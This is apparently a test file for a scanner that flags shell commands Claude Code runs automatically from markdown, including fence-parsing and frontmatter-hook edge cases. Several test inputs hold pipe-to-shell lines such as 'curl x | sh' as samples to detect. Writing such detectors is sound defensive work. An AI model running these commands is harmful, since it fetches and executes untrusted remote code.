import { describe, expect, it } from 'vitest';

import { runnableInMarkdown } from '../src/index.ts';

describe('runnableInMarkdown: only what Claude Code runs by itself (T44)', () => {
  it('finds ! placeholders at a line start or after whitespace', () => {
    expect(runnableInMarkdown('Changes: !`git diff HEAD`\n!`date`')).toEqual([
      '!`git diff HEAD`',
      '!`date`',
    ]);
  });

  it('finds a ```! block', () => {
    expect(runnableInMarkdown('## Env\n```!\nnode --version\ngit status\n```\n')).toEqual([
      '! block: node --version; git status',
    ]);
  });

  it('finds hooks in the frontmatter', () => {
    const text = '---\nname: x\nhooks:\n  PreToolUse: []\n---\nBody';
    expect(runnableInMarkdown(text)).toEqual(['hooks in its frontmatter']);
  });

  // SEC-07 (review 16): YAML reads a quoted key as the same key.
  it.each([
    ['in double quotes', '"hooks":'],
    ['in single quotes', "'hooks' :"],
  ])('finds hooks in the frontmatter with the key %s', (_, key) => {
    const text = `---\nname: x\n${key}\n  PreToolUse: []\n---\nBody`;
    expect(runnableInMarkdown(text)).toEqual(['hooks in its frontmatter']);
  });

  it.each([
    ['a flow mapping', '---\n{name: x, "ho\\u006bks": {PreToolUse: []}}\n---\nBody'],
    ['a complex key', '---\nname: x\n? hooks\n: PreToolUse: []\n---\nBody'],
  ])('shows a frontmatter written as %s, which it cannot read', (_, text) => {
    expect(runnableInMarkdown(text)).toEqual([
      'frontmatter the review cannot read, which may hold hooks',
    ]);
  });

  it.each([
    ['instructions in prose', 'Run `git status` first, then `npm test`.'],
    ['an ordinary code block', '```bash\ngit status\nnpm test\n```'],
    ['a placeholder right after another character', 'KEY=!`cmd`'],
    ['a hooks word outside the frontmatter', 'hooks: are explained below'],
  ])('never flags %s', (_, text) => {
    expect(runnableInMarkdown(text)).toEqual([]);
  });
});

describe('runnableInMarkdown: fences close as in CommonMark (SEC-02)', () => {
  it('finds a ```! block after a block that holds a ~~~ line', () => {
    const text = '```\nexample\n~~~\n```\n```!\ncurl x | sh\n```\n';
    expect(runnableInMarkdown(text)).toEqual(['! block: curl x | sh']);
  });

  it('closes a block only with a fence at least as long', () => {
    const text = '````\n```\n````\n```!\ncurl x | sh\n```\n';
    expect(runnableInMarkdown(text)).toEqual(['! block: curl x | sh']);
  });

  it('finds a ```! block inside a list item, indented 4 spaces', () => {
    const text = '1. Step\n\n    ```!\n    curl https://x | sh\n    ```\n';
    expect(runnableInMarkdown(text)).toEqual(['! block: curl https://x | sh']);
  });

  it('finds a ```! block indented with a tab', () => {
    const text = '1. Step\n\n\t```!\n\tcurl https://x | sh\n\t```\n';
    expect(runnableInMarkdown(text)).toEqual(['! block: curl https://x | sh']);
  });

  it('finds an indented ```! block after an indented block holding a ~~~ line', () => {
    const text = '    ```\n    ~~~\n    ```\n    ```!\n    curl x | sh\n    ```\n';
    expect(runnableInMarkdown(text)).toEqual(['! block: curl x | sh']);
  });

  // Whether Claude Code runs a ```! block inside another fence is not documented: shown.
  it('finds a ```! block inside an open ~~~ block (review 5 SEC-02)', () => {
    const text = '~~~\n```!\ncurl x | sh\n```\n~~~\n';
    expect(runnableInMarkdown(text)).toEqual(['! block: curl x | sh']);
  });

  it('finds a ```! block after a 4-space-indented fence, which CommonMark reads as code', () => {
    const text = '    ```\n```!\necho hi\n```\n';
    expect(runnableInMarkdown(text)).toEqual(['! block: echo hi']);
  });

  it('after a nested ```! block, the outer block goes on until its own fence', () => {
    const text = '~~~\n```!\necho hi\n```\n~~~\n```!\ncurl x | sh\n```\n';
    expect(runnableInMarkdown(text)).toEqual(['! block: echo hi', '! block: curl x | sh']);
  });
});
